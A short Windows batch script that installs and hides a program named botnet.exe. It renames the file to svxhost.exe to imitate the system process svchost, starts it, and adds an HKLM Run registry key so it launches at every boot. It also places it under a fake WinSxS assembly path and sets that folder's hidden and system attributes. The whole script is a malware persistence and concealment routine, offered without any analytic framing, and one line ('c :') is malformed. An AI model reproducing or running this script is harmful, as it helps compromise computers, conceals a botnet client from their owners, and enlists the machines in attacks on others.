taskkill /F /IM svxhost.exe
del svxhost.exe
rename botnet.exe svxhost.exe
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v svxhost /f
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v svxhost /t REG_SZ /d "C:\WINDOWS\WinSxS\x86_svxhost.VC90.MFC_1fc8b3b9a1e18e3b_9.0.30729.4148_x-ww_a57c1f53\svxhost.exe"
start svxhost.exe
c :
cd \
cd windows
cd WinSxS
attrib +r +s +h +a x86_svxhost.VC90.MFC_1fc8b3b9a1e18e3b_9.0.30729.4148_x-ww_a57c1f53
exit

